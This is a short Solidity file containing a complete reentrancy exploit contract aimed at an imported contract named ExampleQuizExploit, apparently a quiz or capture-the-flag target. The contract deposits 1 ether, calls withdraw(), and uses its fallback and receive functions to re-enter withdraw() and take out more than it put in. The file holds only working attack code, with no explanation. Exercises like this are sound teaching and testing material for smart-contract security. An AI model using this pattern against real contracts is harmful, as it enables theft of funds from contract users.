pragma solidity 0.8.4;

import "./ExampleQuizExploit.sol";

contract Exploit {
    ExampleQuizExploit instance;
    uint256 run;

    constructor(ExampleQuizExploit instance_) payable {
        require(msg.value == 1 ether);
        instance = instance_;
        instance.deposit{value: 1 ether}();
    }

    function go() public {
        instance.withdraw();
    }

    function _fallback() internal {
        if (run == 0) {
            run++;
            instance.withdraw();
        }
    }

    fallback() external payable {
        _fallback();
    }

    receive() external payable {
        _fallback();
    }
}
